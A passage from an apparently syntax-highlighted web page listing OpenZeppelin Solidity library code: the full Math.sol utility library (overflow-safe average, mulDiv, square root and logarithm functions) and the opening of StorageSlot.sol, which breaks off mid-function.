class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Standard math utilities missing in the Solidity language.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Math &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Rounding</span> &#123;</span></span><br><span class="line">        Down, <span class="comment">// Toward negative infinity</span></span><br><span class="line">        Up, <span class="comment">// Toward infinity</span></span><br><span class="line">        Zero <span class="comment">// Toward zero</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the largest of two numbers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">max</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the smallest of two numbers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">min</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the average of two numbers. The result is rounded towards</span></span><br><span class="line"><span class="comment">     * zero.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">average</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="comment">// (a + b) / 2 can overflow.</span></span><br><span class="line">        <span class="keyword">return</span> (a &amp; b) + (a ^ b) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the ceiling of the division of two numbers.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This differs from standard division with `/` in that it rounds up instead</span></span><br><span class="line"><span class="comment">     * of rounding down.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">ceilDiv</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="comment">// (a + b - 1) / b can overflow on addition, so we distribute.</span></span><br><span class="line">        <span class="keyword">return</span> a == <span class="number">0</span> ? <span class="number">0</span> : (a - <span class="number">1</span>) / b + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0</span></span><br><span class="line"><span class="comment">     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)</span></span><br><span class="line"><span class="comment">     * with further edits by Uniswap Labs also under MIT license.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">mulDiv</span><span class="params">(uint256 x, uint256 y, uint256 denominator)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256 result)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="comment">// 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use</span></span><br><span class="line">            <span class="comment">// use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256</span></span><br><span class="line">            <span class="comment">// variables such that product = prod1 * 2^256 + prod0.</span></span><br><span class="line">            uint256 prod0; <span class="comment">// Least significant 256 bits of the product</span></span><br><span class="line">            uint256 prod1; <span class="comment">// Most significant 256 bits of the product</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                let mm := mulmod(x, y, not(<span class="number">0</span>))</span><br><span class="line">                prod0 := mul(x, y)</span><br><span class="line">                prod1 := sub(sub(mm, prod0), lt(mm, prod0))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Handle non-overflow cases, 256 by 256 division.</span></span><br><span class="line">            <span class="keyword">if</span> (prod1 == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> prod0 / denominator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Make sure the result is less than 2^256. Also prevents denominator == 0.</span></span><br><span class="line">            require(denominator &gt; prod1, <span class="string">&quot;Math: mulDiv overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">///////////////////////////////////////////////</span></span><br><span class="line">            <span class="comment">// 512 by 256 division.</span></span><br><span class="line">            <span class="comment">///////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Make division exact by subtracting the remainder from [prod1 prod0].</span></span><br><span class="line">            uint256 remainder;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                <span class="comment">// Compute remainder using mulmod.</span></span><br><span class="line">                remainder := mulmod(x, y, denominator)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Subtract 256 bit number from 512 bit number.</span></span><br><span class="line">                prod1 := sub(prod1, gt(remainder, prod0))</span><br><span class="line">                prod0 := sub(prod0, remainder)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always &gt;= 1.</span></span><br><span class="line">            <span class="comment">// See https://cs.stackexchange.com/q/138556/92363.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Does not overflow because the denominator cannot be zero at this stage in the function.</span></span><br><span class="line">            uint256 twos = denominator &amp; (~denominator + <span class="number">1</span>);</span><br><span class="line">            assembly &#123;</span><br><span class="line">                <span class="comment">// Divide denominator by twos.</span></span><br><span class="line">                denominator := div(denominator, twos)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Divide [prod1 prod0] by twos.</span></span><br><span class="line">                prod0 := div(prod0, twos)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.</span></span><br><span class="line">                twos := add(div(sub(<span class="number">0</span>, twos), twos), <span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Shift in bits from prod1 into prod0.</span></span><br><span class="line">            prod0 |= prod1 * twos;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such</span></span><br><span class="line">            <span class="comment">// that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for</span></span><br><span class="line">            <span class="comment">// four bits. That is, denominator * inv = 1 mod 2^4.</span></span><br><span class="line">            uint256 inverse = (<span class="number">3</span> * denominator) ^ <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel&#x27;s lifting lemma, this also works</span></span><br><span class="line">            <span class="comment">// in modular arithmetic, doubling the correct bits in each step.</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^8</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^16</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^32</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^64</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^128</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^256</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Because the division is now exact we can divide by multiplying with the modular inverse of denominator.</span></span><br><span class="line">            <span class="comment">// This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is</span></span><br><span class="line">            <span class="comment">// less than 2^256, this is the final result. We don&#x27;t need to compute the high bits of the result and prod1</span></span><br><span class="line">            <span class="comment">// is no longer required.</span></span><br><span class="line">            result = prod0 * inverse;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">mulDiv</span><span class="params">(uint256 x, uint256 y, uint256 denominator, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = mulDiv(x, y, denominator);</span><br><span class="line">        <span class="keyword">if</span> (rounding == Rounding.Up &amp;&amp; mulmod(x, y, denominator) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Inspired by Henry S. Warren, Jr.&#x27;s &quot;Hacker&#x27;s Delight&quot; (Chapter 11).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">sqrt</span><span class="params">(uint256 a)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// We know that the &quot;msb&quot; (most significant bit) of our target number `a` is a power of 2 such that we have</span></span><br><span class="line">        <span class="comment">// `msb(a) &lt;= a &lt; 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// This can be rewritten `2**log2(a) &lt;= a &lt; 2**(log2(a) + 1)`</span></span><br><span class="line">        <span class="comment">// → `sqrt(2**k) &lt;= sqrt(a) &lt; sqrt(2**(k+1))`</span></span><br><span class="line">        <span class="comment">// → `2**(k/2) &lt;= sqrt(a) &lt; 2**((k+1)/2) &lt;= 2**(k/2 + 1)`</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.</span></span><br><span class="line">        uint256 result = <span class="number">1</span> &lt;&lt; (log2(a) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,</span></span><br><span class="line">        <span class="comment">// since it is the square root of a uint256. Newton&#x27;s method converges quadratically (precision doubles at</span></span><br><span class="line">        <span class="comment">// every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision</span></span><br><span class="line">        <span class="comment">// into the expected uint128 result.</span></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> min(result, a / result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates sqrt(a), following the selected rounding direction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">sqrt</span><span class="params">(uint256 a, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = <span class="built_in">sqrt</span>(a);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; result * result &lt; a ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 2, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log2</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">128</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">128</span>;</span><br><span class="line">                result += <span class="number">128</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">64</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">64</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">32</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">16</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">8</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">4</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">2</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log2</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = log2(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">1</span> &lt;&lt; result &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 10, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log10</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">64</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">64</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">32</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">16</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">8</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">8</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">4</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">4</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">2</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">2</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">1</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log10</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = <span class="built_in">log10</span>(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">10</span> ** result &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 256, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log256</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">128</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">128</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">64</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">32</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">16</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">8</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log256</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = log256(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">1</span> &lt;&lt; (result &lt;&lt; <span class="number">3</span>) &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="StorageSlot-sol"><a href="#StorageSlot-sol" class="headerlink" title="StorageSlot.sol"></a>StorageSlot.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (utils/StorageSlot.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Library for reading and writing primitive types to specific storage slots.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.</span></span><br><span class="line"><span class="comment"> * This library helps with reading and writing to such slots without the need for inline assembly.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example usage to set ERC1967 implementation slot:</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> * contract ERC1967 &#123;</span></span><br><span class="line"><span class="comment"> *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     function _getImplementation() internal view returns (address) &#123;</span></span><br><span class="line"><span class="comment"> *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     function _setImplementation(address newImplementation) internal &#123;</span></span><br><span class="line"><span class="comment"> *         require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span></span><br><span class="line"><span class="comment"> *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library StorageSlot &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSlot</span> &#123;</span></span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BooleanSlot</span> &#123;</span></span><br><span class="line">        <span class="type">bool</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Bytes32Slot</span> &#123;</span></span><br><span class="line">        bytes32 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Uint256Slot</span> &#123;</span></span><br><span class="line">        uint256 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `AddressSlot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">getAddressSlot</span><span class="params">(bytes32 slot)</span> internal pure <span class="title function_">returns</span> <span class="params">(AddressSlot storage r)</span> &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getBytes32Slot(bytes32 slot) internal 